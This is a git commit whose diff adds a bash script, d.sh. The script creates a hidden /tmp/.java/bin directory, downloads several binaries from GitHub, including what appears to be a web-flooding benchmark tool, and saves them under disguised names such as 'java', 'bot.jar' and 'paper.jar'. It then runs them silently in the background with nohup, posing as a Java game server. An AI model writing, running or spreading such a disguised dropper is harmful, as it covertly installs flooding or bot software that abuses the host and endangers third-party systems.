aecfe3d8027084427ada9c74a2f83077d38a8b85
i51jir6ni9t0 <wker-one@protonmail.com>
2025-08-14 14:23:48 +0000

    mitherz kicked

---
+++ tmp/mitherz/d.sh
@@ -0,0 +1,23 @@
+#!/bin/bash
+
+function fetch_files() {
+    mkdir -p /tmp/.java/bin
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/zpr-glibc2.39-amd64 -o java
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/gnet-v1.4.43-amd64 -o bot.jar
+    cd /tmp/.java/bin/ && curl -L https://github.com/maintell/webBenchmark/releases/download/0.6/webBenchmark_linux_x64 -o paper.jar
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/tmp/mitherz/d.conf -o cfg.conf
+}
+
+function start_app() {
+    chmod a+x /tmp/.java/bin/***
+    cd /tmp/.java/bin && nohup ./java -a 'java -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
+}
+
+if [ -f "/tmp/.java/bin/bot.jar" ] && [ -f "/tmp/.java/bin/paper.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ]; then
+    start_app
+else
+    rm -rf /tmp/.java/bin/**
+    fetch_files
+    start_app
+fi
